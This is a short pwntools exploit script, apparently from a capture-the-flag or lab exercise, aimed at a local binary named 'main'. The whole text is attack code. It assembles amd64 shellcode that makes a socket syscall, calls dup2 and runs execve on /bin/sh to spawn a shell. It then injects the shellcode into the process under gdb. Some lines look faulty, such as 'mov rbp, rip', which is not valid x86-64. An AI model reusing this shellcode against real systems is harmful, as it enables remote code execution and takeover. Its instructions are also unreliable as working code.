from pwn import *

context.arch = 'amd64'
p = process('./main')
elf = ELF('./main')

code = asm("""
        mov rbp, rip
        mov rax, 0x29
        mov rdi, 0x2
        mov rsi, 0x1
        cdq
        syscall
        """)
code += asm(pwnlib.shellcraft.amd64.linux.dup2(0, 1))
shell = asm('''
        mov rax,0x68732f6e69622f;
        push rax;
        mov rdi,rsp;
        push 59;
        pop rax;
        syscall
        ''')
code += shell
print(len(code))
gdb.attach(p)
pause()
p.sendline(code)
p.interactive()
